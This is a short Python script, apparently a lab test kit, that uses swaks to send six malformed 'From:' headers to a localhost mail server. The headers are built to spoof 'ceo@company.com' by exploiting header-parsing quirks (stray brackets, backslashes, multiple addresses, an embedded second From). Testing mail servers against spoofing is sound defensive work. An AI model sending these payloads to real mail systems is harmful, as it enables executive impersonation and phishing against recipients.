import subprocess
import time

SERVER = "localhost"
RECIPIENT = "vagrant@myreceiver.com"
ENVELOPE_FROM = "vagrant@mysender.com"

test_payloads = [
    'From: ceo@company.com>\nTo: vagrant@myreceiver.com\nSubject: Attack 1',
    'From: ceo@company.com\\\nTo: vagrant@myreceiver.com\nSubject: Attack 2',
    'From: ceo@company.com) \nTo: vagrant@myreceiver.com\nSubject: Attack 3',
    'From: ceo@company.com, ceo@department.company.com\nTo: vagrant@myreceiver.com\nSubject: Attack 4',
    'From: ,<ceo@company.com>\nTo: vagrant@myreceiver.com\nSubject: Attack 5',
    'From: vagrant@mysender.com:From: <ceo@company.com>\nTo: vagrant@myreceiver.com\nSubject: Attack 6',
    'From: vagrant@mysender.com\nTo: vagrant@myreceiver.com\nSubject: Normal email for test'
]

def run_swaks():
    for i, payload in enumerate(test_payloads, 1):
        cmd = [
            "swaks",
            "--to", RECIPIENT,
            "--from", ENVELOPE_FROM,
            "--server", SERVER,
            "--data", payload,
        ]
        
        try:
            subprocess.run(cmd, capture_output=True, text=True)
            print(f"Attack {i} sent. Check logs/mailbox for results.")
        except Exception as e:
            print(f"Attack {i} failed to send: {e}")
        
        time.sleep(1)

if __name__ == "__main__":
    print(f"Starting spoof tests to {RECIPIENT}...")
    run_swaks()
    print("Done.")